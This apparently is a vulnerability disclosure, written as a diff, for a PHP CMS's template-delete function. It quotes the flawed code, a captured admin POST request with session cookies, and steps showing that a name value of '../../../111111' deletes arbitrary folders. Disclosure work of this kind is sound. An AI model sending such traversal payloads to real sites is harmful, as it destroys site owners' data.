@@ -1,0 +1,67 @@
+Build environment with PHP5.
+--------------------------------
+affected source code file:
+/system/admin/template/template.class.php
+/system/basic/class/dir.class.php
+--------------------------------
+affected source code:
+
+  ......
+  	public static function remove($path){
+		    $path = self::replace($path.'/');
+		    if($path!=self::replace(ROOT_PATH) && $path!=self::replace(SYSTEM_PATH) && file_exists($path)){
+			      $files = self::read($path);
+			      foreach($files['file'] as $name){
+				        self::delete($path.$name);
+			      }
+			      foreach($files['dir'] as $name){
+				        self::remove($path.$name);
+		    	  }
+			      if(rmdir($path)){
+				        return true;
+			      }
+		    }
+		    return false;
+	  }
+  ...... 
+    public function delete()
+	  {
+		    global $G;
+		    if(isset($G['post']['url']) && isset($G['get']['name'])){
+			      if($G['get']['name']){
+				        dir::remove(ROOT_PATH.$this->path.$G['get']['name']);
+				        alert('删除成功！',url::mpf('template','template','init',array('name'=>null)));
+			      }
+		    }
+		    alert('删除失败！');
+	  }
+  ......
+  
+ ---------------------------------
+  affected executable: 
+    1. After Signing in to the background in advance.Then we can visit the following URL: http://xxx.xxx.com/admin/#template 
+    2. Also, We can click delete and use burpsuite to capture the packets. The packets are as follows: 
+    
+      POST /admin/?mold=template&part=template&func=delete&name=HY001 HTTP/1.1
+      Host: www.xiaodi.com
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate
+      Content-Type: multipart/form-data; boundary=---------------------------5839367451762477292546089136
+      Content-Length: 234
+      Origin: http://www.xiaodi.com
+      Connection: close
+      Referer: http://www.xiaodi.com/admin/?mold=template&part=template&func=init
+      Cookie: Hm_lvt_3155433929be1afd6cef849b9709d4d7=1644917557; cp_language=zh; csrf_d9e0a4=60404822; well_sid=cu9btu984f01altggf4n03vlr7; well_token=A1s_2FdsHuvlQJoOewmNvjbH8H0w3ZH_2FkjUL1su1_2FZxccUIXt7YTfmT71nO4YNTJqh_2B8SJKFJZrzuAw4r54xbkPJ3ow5gGWjL5ugAAY83V5obpdSrQU6W8mZbij8A_3D; Hm_lvt_a8f86a64b6c5978c1fd43732af2b45c0=1646369823; aya_auth=VWcGDgY3BDRfYEElWGlARVVlBTcSJlo5X2cAbgJsSnJbOhUlDzkENFM0UWtYPk0nR3IdLBx5Ty5UPRctBWNRYVUzBj8GMgRoXzhBflg%2BQH0; PHPSESSID=rbhn3busrfvcl3p4jbm78qgrd3
+      Upgrade-Insecure-Requests: 1
+
+      -----------------------------5839367451762477292546089136
+      Content-Disposition: form-data; name="url"
+
+      http://www.xiaodi.com/admin/?mold=template&part=template&func=init
+      -----------------------------5839367451762477292546089136--
+      
+   3.Create a folder named 111111 in the website root directory in advance，then，change the name value in the packet to ../../../111111 
+   4.Then put the data package out, you can see that the 111111 folder in the root directory of the website has been successfully deleted 
+   So, we can delete any folder 
